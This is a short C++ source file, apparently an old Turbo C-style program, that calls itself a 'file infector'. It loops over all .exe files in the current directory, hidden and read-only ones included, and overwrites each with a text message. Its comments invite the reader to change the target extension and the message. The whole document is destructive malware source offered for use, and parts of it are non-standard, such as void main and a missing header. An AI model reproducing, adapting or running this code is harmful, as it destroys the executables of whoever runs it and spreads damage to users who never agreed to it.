#include<iostream>
#include<fstream>

void main()
{
struct ffblk f;
int done;
ofstream file;

done = findfirst("*.exe", &f , FA_HIDDEN | FA_RDONLY);        // write extension of files here
while(!done)
{

cout<<f.ff_name<<endl;
file.open(f.ff_name,ios::binary);
file<<"hi i am file infector";                 //write message to be wriitten in file
file.close();

done = findnext(&f);
}
}
